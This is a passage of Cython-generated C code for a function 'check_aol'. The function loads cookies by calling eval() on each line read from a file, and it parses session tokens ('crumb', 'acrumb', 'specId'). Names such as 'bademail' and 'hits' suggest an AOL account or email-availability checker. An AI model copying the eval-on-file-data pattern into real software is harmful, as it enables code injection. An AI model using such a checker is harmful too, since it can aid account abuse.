                        #if CYTHON_ASSUME_SAFE_MACROS && !CYTHON_AVOID_BORROWED_REFS
                        __pyx_t_21 = PyList_GET_ITEM(__pyx_t_8, __pyx_t_17); __Pyx_INCREF(__pyx_t_21); __pyx_t_17++; if (unlikely(0 < 0)) __PYX_ERR(0, 447, __pyx_L38_error)
                        #else
                        __pyx_t_21 = PySequence_ITEM(__pyx_t_8, __pyx_t_17); __pyx_t_17++; if (unlikely(!__pyx_t_21)) __PYX_ERR(0, 447, __pyx_L38_error)
                        __Pyx_GOTREF(__pyx_t_21);
                        #endif
                      } else {
                        if (__pyx_t_17 >= PyTuple_GET_SIZE(__pyx_t_8)) break;
                        #if CYTHON_ASSUME_SAFE_MACROS && !CYTHON_AVOID_BORROWED_REFS
                        __pyx_t_21 = PyTuple_GET_ITEM(__pyx_t_8, __pyx_t_17); __Pyx_INCREF(__pyx_t_21); __pyx_t_17++; if (unlikely(0 < 0)) __PYX_ERR(0, 447, __pyx_L38_error)
                        #else
                        __pyx_t_21 = PySequence_ITEM(__pyx_t_8, __pyx_t_17); __pyx_t_17++; if (unlikely(!__pyx_t_21)) __PYX_ERR(0, 447, __pyx_L38_error)
                        __Pyx_GOTREF(__pyx_t_21);
                        #endif
                      }
                    } else {
                      __pyx_t_21 = __pyx_t_18(__pyx_t_8);
                      if (unlikely(!__pyx_t_21)) {
                        PyObject* exc_type = PyErr_Occurred();
                        if (exc_type) {
                          if (likely(__Pyx_PyErr_GivenExceptionMatches(exc_type, PyExc_StopIteration))) PyErr_Clear();
                          else __PYX_ERR(0, 447, __pyx_L38_error)
                        }
                        break;
                      }
                      __Pyx_GOTREF(__pyx_t_21);
                    }
                    __Pyx_XDECREF_SET(__pyx_v_line, __pyx_t_21);
                    __pyx_t_21 = 0;

                    
                    __pyx_t_7 = __Pyx_PyObject_GetAttrStr(__pyx_v_line, __pyx_n_s_strip); if (unlikely(!__pyx_t_7)) __PYX_ERR(0, 448, __pyx_L38_error)
                    __Pyx_GOTREF(__pyx_t_7);
                    __pyx_t_20 = NULL;
                    if (CYTHON_UNPACK_METHODS && likely(PyMethod_Check(__pyx_t_7))) {
                      __pyx_t_20 = PyMethod_GET_SELF(__pyx_t_7);
                      if (likely(__pyx_t_20)) {
                        PyObject* function = PyMethod_GET_FUNCTION(__pyx_t_7);
                        __Pyx_INCREF(__pyx_t_20);
                        __Pyx_INCREF(function);
                        __Pyx_DECREF_SET(__pyx_t_7, function);
                      }
                    }
                    __pyx_t_21 = (__pyx_t_20) ? __Pyx_PyObject_CallOneArg(__pyx_t_7, __pyx_t_20) : __Pyx_PyObject_CallNoArg(__pyx_t_7);
                    __Pyx_XDECREF(__pyx_t_20); __pyx_t_20 = 0;
                    if (unlikely(!__pyx_t_21)) __PYX_ERR(0, 448, __pyx_L38_error)
                    __Pyx_GOTREF(__pyx_t_21);
                    __Pyx_DECREF(__pyx_t_7); __pyx_t_7 = 0;
                    __pyx_t_7 = __Pyx_Globals(); if (unlikely(!__pyx_t_7)) __PYX_ERR(0, 448, __pyx_L38_error)
                    __Pyx_GOTREF(__pyx_t_7);
                    __pyx_t_20 = __Pyx_PyDict_NewPresized(19); if (unlikely(!__pyx_t_20)) __PYX_ERR(0, 448, __pyx_L38_error)
                    __Pyx_GOTREF(__pyx_t_20);
                    if (__pyx_v_acrumb) {
                      if (PyDict_SetItem(__pyx_t_20, __pyx_n_s_acrumb, __pyx_v_acrumb) < 0) __PYX_ERR(0, 448, __pyx_L38_error)
                    }
                    __Pyx_GetModuleGlobalName(__pyx_t_19, __pyx_n_s_bademail); if (unlikely(!__pyx_t_19)) __PYX_ERR(0, 448, __pyx_L38_error)
                    __Pyx_GOTREF(__pyx_t_19);
                    if (__pyx_t_19) {
                      if (PyDict_SetItem(__pyx_t_20, __pyx_n_s_bademail, __pyx_t_19) < 0) __PYX_ERR(0, 448, __pyx_L38_error)
                    }
                    __Pyx_DECREF(__pyx_t_19); __pyx_t_19 = 0;
                    if (__pyx_v_cookies) {
                      if (PyDict_SetItem(__pyx_t_20, __pyx_n_s_cookies, __pyx_v_cookies) < 0) __PYX_ERR(0, 448, __pyx_L38_error)
                    }
                    if (__pyx_v_crumb) {
                      if (PyDict_SetItem(__pyx_t_20, __pyx_n_s_crumb, __pyx_v_crumb) < 0) __PYX_ERR(0, 448, __pyx_L38_error)
                    }
                    if (__pyx_v_data) {
                      if (PyDict_SetItem(__pyx_t_20, __pyx_n_s_data, __pyx_v_data) < 0) __PYX_ERR(0, 448, __pyx_L38_error)
                    }
                    if (__pyx_v_email) {
                      if (PyDict_SetItem(__pyx_t_20, __pyx_n_s_email, __pyx_v_email) < 0) __PYX_ERR(0, 448, __pyx_L38_error)
                    }
                    if (__pyx_v_f) {
                      if (PyDict_SetItem(__pyx_t_20, __pyx_n_s_f, __pyx_v_f) < 0) __PYX_ERR(0, 448, __pyx_L38_error)
                    }
                    if (__pyx_v_gg) {
                      if (PyDict_SetItem(__pyx_t_20, __pyx_n_s_gg, __pyx_v_gg) < 0) __PYX_ERR(0, 448, __pyx_L38_error)
                    }
                    if (__pyx_v_headers) {
                      if (PyDict_SetItem(__pyx_t_20, __pyx_n_s_headers, __pyx_v_headers) < 0) __PYX_ERR(0, 448, __pyx_L38_error)
                    }
                    __Pyx_GetModuleGlobalName(__pyx_t_19, __pyx_n_s_hits); if (unlikely(!__pyx_t_19)) __PYX_ERR(0, 448, __pyx_L38_error)
                    __Pyx_GOTREF(__pyx_t_19);
                    if (__pyx_t_19) {
                      if (PyDict_SetItem(__pyx_t_20, __pyx_n_s_hits, __pyx_t_19) < 0) __PYX_ERR(0, 448, __pyx_L38_error)
                    }
                    __Pyx_DECREF(__pyx_t_19); __pyx_t_19 = 0;
                    if (__pyx_v_line) {
                      if (PyDict_SetItem(__pyx_t_20, __pyx_n_s_line, __pyx_v_line) < 0) __PYX_ERR(0, 448, __pyx_L38_error)
                    }
                    if (__pyx_v_name) {
                      if (PyDict_SetItem(__pyx_t_20, __pyx_n_s_name, __pyx_v_name) < 0) __PYX_ERR(0, 448, __pyx_L38_error)
                    }
                    if (__pyx_v_ok) {
                      if (PyDict_SetItem(__pyx_t_20, __pyx_n_s_ok, __pyx_v_ok) < 0) __PYX_ERR(0, 448, __pyx_L38_error)
                    }
                    if (__pyx_v_params) {
                      if (PyDict_SetItem(__pyx_t_20, __pyx_n_s_params, __pyx_v_params) < 0) __PYX_ERR(0, 448, __pyx_L38_error)
                    }
                    if (__pyx_v_res) {
                      if (PyDict_SetItem(__pyx_t_20, __pyx_n_s_res, __pyx_v_res) < 0) __PYX_ERR(0, 448, __pyx_L38_error)
                    }
                    if (__pyx_v_sessionIndex) {
                      if (PyDict_SetItem(__pyx_t_20, __pyx_n_s_sessionIndex, __pyx_v_sessionIndex) < 0) __PYX_ERR(0, 448, __pyx_L38_error)
                    }
                    if (__pyx_v_specData) {
                      if (PyDict_SetItem(__pyx_t_20, __pyx_n_s_specData, __pyx_v_specData) < 0) __PYX_ERR(0, 448, __pyx_L38_error)
                    }
                    if (__pyx_v_specId) {
                      if (PyDict_SetItem(__pyx_t_20, __pyx_n_s_specId, __pyx_v_specId) < 0) __PYX_ERR(0, 448, __pyx_L38_error)
                    }
                    if (__pyx_v_username) {
                      if (PyDict_SetItem(__pyx_t_20, __pyx_n_s_username, __pyx_v_username) < 0) __PYX_ERR(0, 448, __pyx_L38_error)
                    }
                    __pyx_t_19 = PyTuple_New(3); if (unlikely(!__pyx_t_19)) __PYX_ERR(0, 448, __pyx_L38_error)
                    __Pyx_GOTREF(__pyx_t_19);
                    __Pyx_GIVEREF(__pyx_t_21);
                    PyTuple_SET_ITEM(__pyx_t_19, 0, __pyx_t_21);
                    __Pyx_GIVEREF(__pyx_t_7);
                    PyTuple_SET_ITEM(__pyx_t_19, 1, __pyx_t_7);
                    __Pyx_GIVEREF(__pyx_t_20);
                    PyTuple_SET_ITEM(__pyx_t_19, 2, __pyx_t_20);
                    __pyx_t_21 = 0;
                    __pyx_t_7 = 0;
                    __pyx_t_20 = 0;
                    __pyx_t_20 = __Pyx_PyObject_Call(__pyx_builtin_eval, __pyx_t_19, NULL); if (unlikely(!__pyx_t_20)) __PYX_ERR(0, 448, __pyx_L38_error)
                    __Pyx_GOTREF(__pyx_t_20);
                    __Pyx_DECREF(__pyx_t_19); __pyx_t_19 = 0;
                    __Pyx_XDECREF_SET(__pyx_v_cookies, __pyx_t_20);
                    __pyx_t_20 = 0;

                    
                  }
                  __Pyx_DECREF(__pyx_t_8); __pyx_t_8 = 0;

                  
                }
                __Pyx_XDECREF(__pyx_t_16); __pyx_t_16 = 0;
                __Pyx_XDECREF(__pyx_t_15); __pyx_t_15 = 0;
                __Pyx_XDECREF(__pyx_t_14); __pyx_t_14 = 0;
                goto __pyx_L43_try_end;
                __pyx_L38_error:;
                __Pyx_XDECREF(__pyx_t_13); __pyx_t_13 = 0;
                __Pyx_XDECREF(__pyx_t_19); __pyx_t_19 = 0;
                __Pyx_XDECREF(__pyx_t_20); __pyx_t_20 = 0;
                __Pyx_XDECREF(__pyx_t_21); __pyx_t_21 = 0;
                __Pyx_XDECREF(__pyx_t_22); __pyx_t_22 = 0;
                __Pyx_XDECREF(__pyx_t_6); __pyx_t_6 = 0;
                __Pyx_XDECREF(__pyx_t_7); __pyx_t_7 = 0;
                __Pyx_XDECREF(__pyx_t_8); __pyx_t_8 = 0;
                /*except:*/ {
                  __Pyx_AddTraceback("source.check_aol", __pyx_clineno, __pyx_lineno, __pyx_filename);
                  if (__Pyx_GetException(&__pyx_t_8, &__pyx_t_20, &__pyx_t_19) < 0) __PYX_ERR(0, 446, __pyx_L40_except_error)
                  __Pyx_GOTREF(__pyx_t_8);
                  __Pyx_GOTREF(__pyx_t_20);
                  __Pyx_GOTREF(__pyx_t_19);
                  __pyx_t_7 = PyTuple_Pack(3, __pyx_t_8, __pyx_t_20, __pyx_t_19); if (unlikely(!__pyx_t_7)) __PYX_ERR(0, 446, __pyx_L40_except_error)
                  __Pyx_GOTREF(__pyx_t_7);
                  __pyx_t_24 = __Pyx_PyObject_Call(__pyx_t_12, __pyx_t_7, NULL);
                  __Pyx_DECREF(__pyx_t_12); __pyx_t_12 = 0;
                  __Pyx_DECREF(__pyx_t_7); __pyx_t_7 = 0;
                  if (unlikely(!__pyx_t_24)) __PYX_ERR(0, 446, __pyx_L40_except_error)
                  __Pyx_GOTREF(__pyx_t_24);
                  __pyx_t_4 = __Pyx_PyObject_IsTrue(__pyx_t_24);
                  __Pyx_DECREF(__pyx_t_24); __pyx_t_24 = 0;
                  if (__pyx_t_4 < 0) __PYX_ERR(0, 446, __pyx_L40_except_error)
                  __pyx_t_5 = ((!(__pyx_t_4 != 0)) != 0);
                  if (__pyx_t_5) {
                    __Pyx_GIVEREF(__pyx_t_8);
                    __Pyx_GIVEREF(__pyx_t_20);
                    __Pyx_XGIVEREF(__pyx_t_19);
                    __Pyx_ErrRestoreWithState(__pyx_t_8, __pyx_t_20, __pyx_t_19);
                    __pyx_t_8 = 0; __pyx_t_20 = 0; __pyx_t_19 = 0; 
                    __PYX_ERR(0, 446, __pyx_L40_except_error)
                  }
                  __Pyx_XDECREF(__pyx_t_8); __pyx_t_8 = 0;
                  __Pyx_XDECREF(__pyx_t_20); __pyx_t_20 = 0;
                  __Pyx_XDECREF(__pyx_t_19); __pyx_t_19 = 0;
                  goto __pyx_L39_exception_handled;
                }
                __pyx_L40_except_error:;
                __Pyx_XGIVEREF(__pyx_t_16);
                __Pyx_XGIVEREF(__pyx_t_15);
                __Pyx_XGIVEREF(__pyx_t_14);
                __Pyx_ExceptionReset(__pyx_t_16, __pyx_t_15, __pyx_t_14);
                goto __pyx_L10_error;
                __pyx_L39_exception_handled:;
                __Pyx_XGIVEREF(__pyx_t_16);
                __Pyx_XGIVEREF(__pyx_t_15);
                __Pyx_XGIVEREF(__pyx_t_14);
                __Pyx_ExceptionReset(__pyx_t_16, __pyx_t_15, __pyx_t_14);
                __pyx_L43_try_end:;
              }
            }
            /*finally:*/ {
              /*normal exit:*/{
                if (__pyx_t_12) {
                  __pyx_t_14 = __Pyx_PyObject_Call(__pyx_t_12, __pyx_tuple__33, NULL);
                  __Pyx_DECREF(__pyx_t_12); __pyx_t_12 = 0;
                  if (unlikely(!__pyx_t_14)) __PYX_ERR(0, 446, __pyx_L10_error)
                  __Pyx_GOTREF(__pyx_t_14);
                  __Pyx_DECREF(__pyx_t_14); __pyx_t_14 = 0;
                }
                goto __pyx_L37;
              }
              __pyx_L37:;
            }
            goto __pyx_L49;
            __pyx_L34_error:;
            __Pyx_DECREF(__pyx_t_12); __pyx_t_12 = 0;
            goto __pyx_L10_error;
            __pyx_L49:;
          }

          
        }
        __Pyx_XDECREF(__pyx_t_9); __pyx_t_9 = 0;
        __Pyx_XDECREF(__pyx_t_10); __pyx_t_10 = 0;
        __Pyx_XDECREF(__pyx_t_11); __pyx_t_11 = 0;
        goto __pyx_L15_try_end;
        __pyx_L10_error:;
        __Pyx_XDECREF(__pyx_t_13); __pyx_t_13 = 0;
        __Pyx_XDECREF(__pyx_t_19); __pyx_t_19 = 0;
        __Pyx_XDECREF(__pyx_t_20); __pyx_t_20 = 0;
        __Pyx_XDECREF(__pyx_t_21); __pyx_t_21 = 0;
        __Pyx_XDECREF(__pyx_t_22); __pyx_t_22 = 0;
        __Pyx_XDECREF(__pyx_t_6); __pyx_t_6 = 0;
        __Pyx_XDECREF(__pyx_t_7); __pyx_t_7 = 0;
        __Pyx_XDECREF(__pyx_t_8); __pyx_t_8 = 0;

        
        __pyx_t_25 = __Pyx_PyErr_ExceptionMatches(__pyx_builtin_BaseException);
        if (__pyx_t_25) {
          __Pyx_AddTraceback("source.check_aol", __pyx_clineno, __pyx_lineno, __pyx_filename);
          if (__Pyx_GetException(&__pyx_t_19, &__pyx_t_20, &__pyx_t_8) < 0) __PYX_ERR(0, 449, __pyx_L12_except_error)
          __Pyx_GOTREF(__pyx_t_19);
          __Pyx_GOTREF(__pyx_t_20);
          __Pyx_GOTREF(__pyx_t_8);

          
          __Pyx_GetModuleGlobalName(__pyx_t_21, __pyx_n_s_Getaol); if (unlikely(!__pyx_t_21)) __PYX_ERR(0, 450, __pyx_L12_except_error)
          __Pyx_GOTREF(__pyx_t_21);
          __pyx_t_6 = NULL;
          if (CYTHON_UNPACK_METHODS && unlikely(PyMethod_Check(__pyx_t_21))) {
            __pyx_t_6 = PyMethod_GET_SELF(__pyx_t_21);
            if (likely(__pyx_t_6)) {
              PyObject* function = PyMethod_GET_FUNCTION(__pyx_t_21);
              __Pyx_INCREF(__pyx_t_6);
              __Pyx_INCREF(function);
              __Pyx_DECREF_SET(__pyx_t_21, function);
            }
          }
          __pyx_t_7 = (__pyx_t_6) ? __Pyx_PyObject_CallOneArg(__pyx_t_21, __pyx_t_6) : __Pyx_PyObject_CallNoArg(__pyx_t_21);
          __Pyx_XDECREF(__pyx_t_6); __pyx_t_6 = 0;
          if (unlikely(!__pyx_t_7)) __PYX_ERR(0, 450, __pyx_L12_except_error)
          __Pyx_GOTREF(__pyx_t_7);
          __Pyx_DECREF(__pyx_t_21); __pyx_t_21 = 0;
          __Pyx_DECREF(__pyx_t_7); __pyx_t_7 = 0;

          
          /*with:*/ {
            __pyx_t_7 = __Pyx_PyObject_Call(__pyx_builtin_open, __pyx_tuple__42, NULL); if (unlikely(!__pyx_t_7)) __PYX_ERR(0, 451, __pyx_L12_except_error)
            __Pyx_GOTREF(__pyx_t_7);
            __pyx_t_12 = __Pyx_PyObject_LookupSpecial(__pyx_t_7, __pyx_n_s_exit_2); if (unlikely(!__pyx_t_12)) __PYX_ERR(0, 451, __pyx_L12_except_error)
            __Pyx_GOTREF(__pyx_t_12);
            __pyx_t_6 = __Pyx_PyObject_LookupSpecial(__pyx_t_7, __pyx_n_s_enter); if (unlikely(!__pyx_t_6)) __PYX_ERR(0, 451, __pyx_L52_error)
            __Pyx_GOTREF(__pyx_t_6);
            __pyx_t_13 = NULL;
            if (CYTHON_UNPACK_METHODS && likely(PyMethod_Check(__pyx_t_6))) {
              __pyx_t_13 = PyMethod_GET_SELF(__pyx_t_6);
              if (likely(__pyx_t_13)) {
                PyObject* function = PyMethod_GET_FUNCTION(__pyx_t_6);
                __Pyx_INCREF(__pyx_t_13);
                __Pyx_INCREF(function);
                __Pyx_DECREF_SET(__pyx_t_6, function);
              }
            }
            __pyx_t_21 = (__pyx_t_13) ? __Pyx_PyObject_CallOneArg(__pyx_t_6, __pyx_t_13) : __Pyx_PyObject_CallNoArg(__pyx_t_6);
            __Pyx_XDECREF(__pyx_t_13); __pyx_t_13 = 0;
            if (unlikely(!__pyx_t_21)) __PYX_ERR(0, 451, __pyx_L52_error)
            __Pyx_GOTREF(__pyx_t_21);
            __Pyx_DECREF(__pyx_t_6); __pyx_t_6 = 0;
            __pyx_t_6 = __pyx_t_21;
            __pyx_t_21 = 0;
            __Pyx_DECREF(__pyx_t_7); __pyx_t_7 = 0;
            /*try:*/ {
              {
                __Pyx_PyThreadState_declare
                __Pyx_PyThreadState_assign
                __Pyx_ExceptionSave(&__pyx_t_14, &__pyx_t_15, &__pyx_t_16);
                __Pyx_XGOTREF(__pyx_t_14);
                __Pyx_XGOTREF(__pyx_t_15);
                __Pyx_XGOTREF(__pyx_t_16);
                /*try:*/ {
                  __Pyx_XDECREF_SET(__pyx_v_f, __pyx_t_6);
                  __pyx_t_6 = 0;

                  
                  if (likely(PyList_CheckExact(__pyx_v_f)) || PyTuple_CheckExact(__pyx_v_f)) {
                    __pyx_t_6 = __pyx_v_f; __Pyx_INCREF(__pyx_t_6); __pyx_t_17 = 0;
                    __pyx_t_18 = NULL;
                  } else {
                    __pyx_t_17 = -1; __pyx_t_6 = PyObject_GetIter(__pyx_v_f); if (unlikely(!__pyx_t_6)) __PYX_ERR(0, 452, __pyx_L58_error)
                    __Pyx_GOTREF(__pyx_t_6);
                    __pyx_t_18 = Py_TYPE(__pyx_t_6)->tp_iternext; if (unlikely(!__pyx_t_18)) __PYX_ERR(0, 452, __pyx_L58_error)
                  }
                  for (;;) {
                    if (likely(!__pyx_t_18)) {
                      if (likely(PyList_CheckExact(__pyx_t_6))) {
                        if (__pyx_t_17 >= PyList_GET_SIZE(__pyx_t_6)) break;
                        #if CYTHON_ASSUME_SAFE_MACROS && !CYTHON_AVOID_BORROWED_REFS
                        __pyx_t_7 = PyList_GET_ITEM(__pyx_t_6, __pyx_t_17); __Pyx_INCREF(__pyx_t_7); __pyx_t_17++; if (unlikely(0 < 0)) __PYX_ERR(0, 452, __pyx_L58_error)
                        #else
                        __pyx_t_7 = PySequence_ITEM(__pyx_t_6, __pyx_t_17); __pyx_t_17++; if (unlikely(!__pyx_t_7)) __PYX_ERR(0, 452, __pyx_L58_error)
                        __Pyx_GOTREF(__pyx_t_7);
                        #endif
                      } else {
                        if (__pyx_t_17 >= PyTuple_GET_SIZE(__pyx_t_6)) break;
                        #if CYTHON_ASSUME_SAFE_MACROS && !CYTHON_AVOID_BORROWED_REFS
                        __pyx_t_7 = PyTuple_GET_ITEM(__pyx_t_6, __pyx_t_17); __Pyx_INCREF(__pyx_t_7); __pyx_t_17++; if (unlikely(0 < 0)) __PYX_ERR(0, 452, __pyx_L58_error)
                        #else
                        __pyx_t_7 = PySequence_ITEM(__pyx_t_6, __pyx_t_17); __pyx_t_17++; if (unlikely(!__pyx_t_7)) __PYX_ERR(0, 452, __pyx_L58_error)
                        __Pyx_GOTREF(__pyx_t_7);
                        #endif
                      }
                    } else {
                      __pyx_t_7 = __pyx_t_18(__pyx_t_6);
                      if (unlikely(!__pyx_t_7)) {
                        PyObject* exc_type = PyErr_Occurred();
                        if (exc_type) {
                          if (likely(__Pyx_PyErr_GivenExceptionMatches(exc_type, PyExc_StopIteration))) PyErr_Clear();
                          else __PYX_ERR(0, 452, __pyx_L58_error)
                        }
                        break;
                      }
                      __Pyx_GOTREF(__pyx_t_7);
                    }
                    __Pyx_XDECREF_SET(__pyx_v_line, __pyx_t_7);
                    __pyx_t_7 = 0;

                    
                    __pyx_t_13 = __Pyx_PyObject_GetAttrStr(__pyx_v_line, __pyx_n_s_strip); if (unlikely(!__pyx_t_13)) __PYX_ERR(0, 453, __pyx_L58_error)
                    __Pyx_GOTREF(__pyx_t_13);
                    __pyx_t_22 = NULL;
                    if (CYTHON_UNPACK_METHODS && likely(PyMethod_Check(__pyx_t_13))) {
                      __pyx_t_22 = PyMethod_GET_SELF(__pyx_t_13);
                      if (likely(__pyx_t_22)) {
                        PyObject* function = PyMethod_GET_FUNCTION(__pyx_t_13);
                        __Pyx_INCREF(__pyx_t_22);
                        __Pyx_INCREF(function);
                        __Pyx_DECREF_SET(__pyx_t_13, function);
                      }
                    }
                    __pyx_t_21 = (__pyx_t_22) ? __Pyx_PyObject_CallOneArg(__pyx_t_13, __pyx_t_22) : __Pyx_PyObject_CallNoArg(__pyx_t_13);
                    __Pyx_XDECREF(__pyx_t_22); __pyx_t_22 = 0;
                    if (unlikely(!__pyx_t_21)) __PYX_ERR(0, 453, __pyx_L58_error)
                    __Pyx_GOTREF(__pyx_t_21);
                    __Pyx_DECREF(__pyx_t_13); __pyx_t_13 = 0;
                    __pyx_t_13 = __Pyx_PyObject_GetAttrStr(__pyx_t_21, __pyx_n_s_split); if (unlikely(!__pyx_t_13)) __PYX_ERR(0, 453, __pyx_L58_error)
                    __Pyx_GOTREF(__pyx_t_13);
                    __Pyx_DECREF(__pyx_t_21); __pyx_t_21 = 0;
                    __pyx_t_21 = NULL;
                    if (CYTHON_UNPACK_METHODS && likely(PyMethod_Check(__pyx_t_13))) {
                      __pyx_t_21 = PyMethod_GET_SELF(__pyx_t_13);
                      if (likely(__pyx_t_21)) {
                        PyObject* function = PyMethod_GET_FUNCTION(__pyx_t_13);
                        __Pyx_INCREF(__pyx_t_21);
                        __Pyx_INCREF(function);
                        __Pyx_DECREF_SET(__pyx_t_13, function);
                      }
                    }
                    __pyx_t_7 = (__pyx_t_21) ? __Pyx_PyObject_Call2Args(__pyx_t_13, __pyx_t_21, __pyx_n_u__37) : __Pyx_PyObject_CallOneArg(__pyx_t_13, __pyx_n_u__37);
                    __Pyx_XDECREF(__pyx_t_21); __pyx_t_21 = 0;
                    if (unlikely(!__pyx_t_7)) __PYX_ERR(0, 453, __pyx_L58_error)
                    __Pyx_GOTREF(__pyx_t_7);
                    __Pyx_DECREF(__pyx_t_13); __pyx_t_13 = 0;
                    if ((likely(PyTuple_CheckExact(__pyx_t_7))) || (PyList_CheckExact(__pyx_t_7))) {
                      PyObject* sequence = __pyx_t_7;
                      Py_ssize_t size = __Pyx_PySequence_SIZE(sequence);
                      if (unlikely(size != 5)) {
                        if (size > 5) __Pyx_RaiseTooManyValuesError(5);
                        else if (size >= 0) __Pyx_RaiseNeedMoreValuesError(size);
                        __PYX_ERR(0, 453, __pyx_L58_error)
                      }
                      #if CYTHON_ASSUME_SAFE_MACROS && !CYTHON_AVOID_BORROWED_REFS
                      if (likely(PyTuple_CheckExact(sequence))) {
                        __pyx_t_13 = PyTuple_GET_ITEM(sequence, 0); 
                        __pyx_t_21 = PyTuple_GET_ITEM(sequence, 1); 
                        __pyx_t_22 = PyTuple_GET_ITEM(sequence, 2); 
                        __pyx_t_26 = PyTuple_GET_ITEM(sequence, 3); 
                        __pyx_t_27 = PyTuple_GET_ITEM(sequence, 4); 
                      } else {
                        __pyx_t_13 = PyList_GET_ITEM(sequence, 0); 
                        __pyx_t_21 = PyList_GET_ITEM(sequence, 1); 
                        __pyx_t_22 = PyList_GET_ITEM(sequence, 2); 
                        __pyx_t_26 = PyList_GET_ITEM(sequence, 3); 
                        __pyx_t_27 = PyList_GET_ITEM(sequence, 4); 
                      }
                      __Pyx_INCREF(__pyx_t_13);
                      __Pyx_INCREF(__pyx_t_21);
                      __Pyx_INCREF(__pyx_t_22);
                      __Pyx_INCREF(__pyx_t_26);
                      __Pyx_INCREF(__pyx_t_27);
                      #else
                      {
                        Py_ssize_t i;
                        PyObject** temps[5] = {&__pyx_t_13,&__pyx_t_21,&__pyx_t_22,&__pyx_t_26,&__pyx_t_27};
                        for (i=0; i < 5; i++) {
                          PyObject* item = PySequence_ITEM(sequence, i); if (unlikely(!item)) __PYX_ERR(0, 453, __pyx_L58_error)
                          __Pyx_GOTREF(item);
                          *(temps[i]) = item;
                        }
                      }
                      #endif
                      __Pyx_DECREF(__pyx_t_7); __pyx_t_7 = 0;
                    } else {
                      Py_ssize_t index = -1;
                      PyObject** temps[5] = {&__pyx_t_13,&__pyx_t_21,&__pyx_t_22,&__pyx_t_26,&__pyx_t_27};
                      __pyx_t_28 = PyObject_GetIter(__pyx_t_7); if (unlikely(!__pyx_t_28)) __PYX_ERR(0, 453, __pyx_L58_error)
                      __Pyx_GOTREF(__pyx_t_28);
                      __Pyx_DECREF(__pyx_t_7); __pyx_t_7 = 0;
                      __pyx_t_23 = Py_TYPE(__pyx_t_28)->tp_iternext;
                      for (index=0; index < 5; index++) {
                        PyObject* item = __pyx_t_23(__pyx_t_28); if (unlikely(!item)) goto __pyx_L68_unpacking_failed;
                        __Pyx_GOTREF(item);
                        *(temps[index]) = item;
                      }
                      if (__Pyx_IternextUnpackEndCheck(__pyx_t_23(__pyx_t_28), 5) < 0) __PYX_ERR(0, 453, __pyx_L58_error)
                      __pyx_t_23 = NULL;
                      __Pyx_DECREF(__pyx_t_28); __pyx_t_28 = 0;
                      goto __pyx_L69_unpacking_done;
                      __pyx_L68_unpacking_failed:;
                      __Pyx_DECREF(__pyx_t_28); __pyx_t_28 = 0;
                      __pyx_t_23 = NULL;
                      if (__Pyx_IterFinish() == 0) __Pyx_RaiseNeedMoreValuesError(index);
                      __PYX_ERR(0, 453, __pyx_L58_error)
                      __pyx_L69_unpacking_done:;
                    }
                    __Pyx_XDECREF_SET(__pyx_v_specData, __pyx_t_13);
                    __pyx_t_13 = 0;
                    __Pyx_XDECREF_SET(__pyx_v_specId, __pyx_t_21);
                    __pyx_t_21 = 0;
                    __Pyx_XDECREF_SET(__pyx_v_crumb, __pyx_t_22);
                    __pyx_t_22 = 0;
                    __Pyx_XDECREF_SET(__pyx_v_sessionIndex, __pyx_t_26);
                    __pyx_t_26 = 0;
                    __Pyx_XDECREF_SET(__pyx_v_acrumb, __pyx_t_27);
                    __pyx_t_27 = 0;

                    
                  }
                  __Pyx_DECREF(__pyx_t_6); __pyx_t_6 = 0;

                  
                }
                __Pyx_XDECREF(__pyx_t_14); __pyx_t_14 = 0;
                __Pyx_XDECREF(__pyx_t_15); __pyx_t_15 = 0;
                __Pyx_XDECREF(__pyx_t_16); __pyx_t_16 = 0;
                goto __pyx_L65_try_end;
                __pyx_L58_error:;
                __Pyx_XDECREF(__pyx_t_13); __pyx_t_13 = 0;
                __Pyx_XDECREF(__pyx_t_21); __pyx_t_21 = 0;
                __Pyx_XDECREF(__pyx_t_22); __pyx_t_22 = 0;
                __Pyx_XDECREF(__pyx_t_26); __pyx_t_26 = 0;
                __Pyx_XDECREF(__pyx_t_27); __pyx_t_27 = 0;
                __Pyx_XDECREF(__pyx_t_28); __pyx_t_28 = 0;
                __Pyx_XDECREF(__pyx_t_6); __pyx_t_6 = 0;
                __Pyx_XDECREF(__pyx_t_7); __pyx_t_7 = 0;
                /*except:*/ {
                  __Pyx_AddTraceback("source.check_aol", __pyx_clineno, __pyx_lineno, __pyx_filename);
                  if (__Pyx_GetException(&__pyx_t_6, &__pyx_t_7, &__pyx_t_27) < 0) __PYX_ERR(0, 451, __pyx_L60_except_error)
                  __Pyx_GOTREF(__pyx_t_6);
                  __Pyx_GOTREF(__pyx_t_7);
                  __Pyx_GOTREF(__pyx_t_27);
                  __pyx_t_26 = PyTuple_Pack(3, __pyx_t_6, __pyx_t_7, __pyx_t_27); if (unlikely(!__pyx_t_26)) __PYX_ERR(0, 451, __pyx_L60_except_error)
                  __Pyx_GOTREF(__pyx_t_26);
                  __pyx_t_24 = __Pyx_PyObject_Call(__pyx_t_12, __pyx_t_26, NULL);
                  __Pyx_DECREF(__pyx_t_12); __pyx_t_12 = 0;
                  __Pyx_DECREF(__pyx_t_26); __pyx_t_26 = 0;
                  if (unlikely(!__pyx_t_24)) __PYX_ERR(0, 451, __pyx_L60_except_error)
                  __Pyx_GOTREF(__pyx_t_24);
                  __pyx_t_5 = __Pyx_PyObject_IsTrue(__pyx_t_24);
                  __Pyx_DECREF(__pyx_t_24); __pyx_t_24 = 0;
                  if (__pyx_t_5 < 0) __PYX_ERR(0, 451, __pyx_L60_except_error)
                  __pyx_t_4 = ((!(__pyx_t_5 != 0)) != 0);
                  if (__pyx_t_4) {
                    __Pyx_GIVEREF(__pyx_t_6);
                    __Pyx_GIVEREF(__pyx_t_7);
                    __Pyx_XGIVEREF(__pyx_t_27);
                    __Pyx_ErrRestoreWithState(__pyx_t_6, __pyx_t_7, __pyx_t_27);
                    __pyx_t_6 = 0; __pyx_t_7 = 0; __pyx_t_27 = 0; 
                    __PYX_ERR(0, 451, __pyx_L60_except_error)
                  }
                  __Pyx_XDECREF(__pyx_t_6); __pyx_t_6 = 0;
                  __Pyx_XDECREF(__pyx_t_7); __pyx_t_7 = 0;
                  __Pyx_XDECREF(__pyx_t_27); __pyx_t_27 = 0;
                  goto __pyx_L59_exception_handled;
                }
                __pyx_L60_except_error:;
                __Pyx_XGIVEREF(__pyx_t_14);
                __Pyx_XGIVEREF(__pyx_t_15);
                __Pyx_XGIVEREF(__pyx_t_16);
                __Pyx_ExceptionReset(__pyx_t_14, __pyx_t_15, __pyx_t_16);
                goto __pyx_L12_except_error;
                __pyx_L59_exception_handled:;
                __Pyx_XGIVEREF(__pyx_t_14);
